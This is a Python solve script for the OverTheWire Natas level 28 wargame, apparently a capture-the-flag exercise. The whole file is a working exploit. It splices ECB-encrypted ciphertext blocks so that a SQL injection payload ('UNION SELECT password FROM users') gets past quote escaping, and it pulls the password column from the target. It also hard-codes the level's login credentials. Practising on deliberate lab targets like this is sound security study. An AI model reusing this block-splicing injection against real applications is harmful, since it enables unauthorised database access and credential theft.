import requests
from requests.auth import HTTPBasicAuth
from urllib.parse import quote_plus, unquote
from base64 import b64encode, b64decode
import os
import webbrowser

sesh = requests.Session()

BLOCK_SIZE = 16
OUTFILE = "28.html"
# cant put quotes that easy :(
payload = "UNION SELECT password FROM users"
payload = " " * 9 + "' " + payload + " # "

print("*** Trying:", payload)

url = "http://natas28.natas.labs.overthewire.org/index.php"
auth = HTTPBasicAuth("natas28", "1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj")
headers = { "Content-Type": "x-www-form-urlencoded"}

spaces = " " * 100
res0 = sesh.get(url, auth=auth, params={"query": spaces}, headers=headers)
enc0 = b64decode(unquote(res0.url.split("?query=")[1]))

res1 = sesh.get(url, auth=auth, params={"query": payload}, headers=headers)
enc1 = b64decode(unquote(res1.url.split("?query=")[1]))

enc_comb = enc0[:BLOCK_SIZE*3] + enc1[BLOCK_SIZE*3:]

enc_comb = quote_plus(b64encode(enc_comb))

url = f"http://natas28.natas.labs.overthewire.org/search.php?query={enc_comb}"
res2 = sesh.get(url, auth=auth)

with open(OUTFILE, "w") as f:
    f.write(res2.text)

webbrowser.open("file://" + os.path.realpath(OUTFILE), new=2)
